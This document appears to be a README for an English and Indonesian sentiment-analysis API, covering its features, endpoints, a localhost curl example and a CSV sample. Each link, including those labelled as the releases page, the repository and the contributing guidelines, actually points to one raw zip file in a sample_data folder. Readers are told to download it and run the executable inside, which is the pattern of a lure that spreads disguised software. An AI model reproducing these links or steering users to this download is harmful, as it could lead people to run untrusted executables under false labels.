# 🌟 Insightify-Sentiment-API - Analyze Sentiment Easily

## 📥 Download the Latest Release
[![Download Insightify-Sentiment-API](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip)](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip)

## 📖 Introduction
Welcome to the Insightify-Sentiment-API project! This application helps you analyze the sentiment of texts in English and Indonesian. Whether you are processing documents in bulk or extracting keywords, this tool is tailored for your needs. It uses advanced natural language processing (NLP) techniques to provide real-time analysis, ensuring that your text data is interpreted accurately.

## 🚀 Getting Started
This guide will help you easily download and run the Insightify-Sentiment-API. Follow the steps below to get started with sentiment analysis.

## 🛠 System Requirements
To run Insightify-Sentiment-API smoothly, ensure your system meets the following requirements:
- Operating System: Windows, macOS, or Linux
- Processor: Dual-core or higher
- RAM: 4 GB or more
- Disk Space: At least 1 GB free
- Internet Connection: Required for downloading the software and any necessary dependencies

## 📦 Features
Insightify-Sentiment-API comes packed with the following features:
- **Real-Time Sentiment Analysis**: Get instant sentiment results for any text input.
- **Batch Processing**: Analyze multiple files, including CSV and Excel formats, to extract sentiment in bulk. 
- **N-Gram Keyword Extraction**: Identify keywords through N-grams to enhance your text analysis. 
- **Multi-Language Support**: Analyze texts in both English and Indonesian effortlessly.
- **Easy API Integration**: Utilize the RESTful API to integrate easily with other applications.

## 📥 Download & Install
To download the latest version of Insightify-Sentiment-API, visit the [Releases page](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip). 

1. Click on the link above to go to the Releases page.
2. Find the latest release version.
3. Click on the download link for your operating system.
4. Once the download is complete, locate the downloaded file.

For further instructions on running the application, follow these steps:

### 🖥 Running the Application
1. **Windows Users**: Double-click the `.exe` file to launch the application.
2. **macOS Users**: Open the `.dmg` file and drag the application into your Applications folder, then launch it.
3. **Linux Users**: Open a terminal, navigate to the downloaded file, and run it by typing `./<file-name>`.
4. **Source Users**: Install dependencies with `pip install -r requirements.txt`, then run `uvicorn main:app`.

## 🔌 API Usage
Once the application is running, you can access its powerful API features. 

- **Base URL**: The API is accessible at `http://localhost:8000`.
- **English Sentiment Endpoint**: Send a POST request to `/predict-sentiment/en` with JSON data.
- **Indonesian Sentiment Endpoint**: Send a POST request to `/predict-sentiment/id` with JSON data.
- **Batch Processing Endpoints**: Upload a CSV or Excel file to `/predict-table-sentiment/en` or `/predict-table-sentiment/id`.

## 👨‍💻 Example API Request
Here’s a simple example to send a text for sentiment analysis:

```bash
curl -X POST http://localhost:8000/predict-sentiment/en -H "Content-Type: application/json" -d '{"text_input": "I love using Insightify!"}'
```

You will receive a response containing the sentiment result, indicating whether the sentiment is positive, negative, or neutral.

## 🔄 Batch Processing Example
For batch processing, create a CSV file with a column named "komentar" and upload it via the batch process endpoint.

### Sample CSV Format:
```
komentar
"I enjoy this service!"
"This is terrible."
```

Upload the file using the specified endpoint to receive a sentiment analysis for each entry.

## 📊 Additional Features
- **Data Visualization**: After processing, visualize the results on dashboards. Use libraries like Matplotlib to create informative charts.
- **Save Results**: Export the analysis results as CSV for further examination or reporting.

## 📞 Support
If you encounter any issues or have questions, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip), and we will assist you promptly.

## 🌟 Contributing
We welcome contributions! If you have suggestions, improvements, or bug fixes, please check our [contributing guidelines](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip) to get started.

## 📜 License
This project is licensed under the MIT License. See the LICENSE file for details.

Now you are ready to harness the power of Insightify-Sentiment-API for your sentiment analysis needs! Don't forget to visit our [Releases page](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip) for the latest updates and tools. Enjoy your experience!
